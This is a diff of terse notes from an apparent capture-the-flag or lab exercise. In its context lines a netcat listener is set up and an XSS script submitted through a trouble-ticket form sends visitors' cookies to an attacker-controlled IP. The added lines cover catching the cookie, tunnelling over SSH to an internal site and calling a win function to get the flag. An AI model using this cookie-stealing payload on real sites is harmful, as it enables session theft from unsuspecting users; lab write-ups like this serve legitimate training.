@@ -56,3 +56,11 @@ nc -lvnkp 4444
 #We went to the trouble tickets, and submitted
 <script>document.location="http://10.50.153.201:4444/?username=" + document.cookie;</script>
 #Waited.
+#We got it.
+#Create a tunnel.
+ssh billybob@127.0.0.1 -p 11112 -L21111:10.100.28.55.80
+#Go to website
+127.0.0.1:21111
+Do the thing. Once you come across password one, we looked at source code. i wanted to select "win_the-game" because it looked important.
+win_the_game()
+#flag appeared.
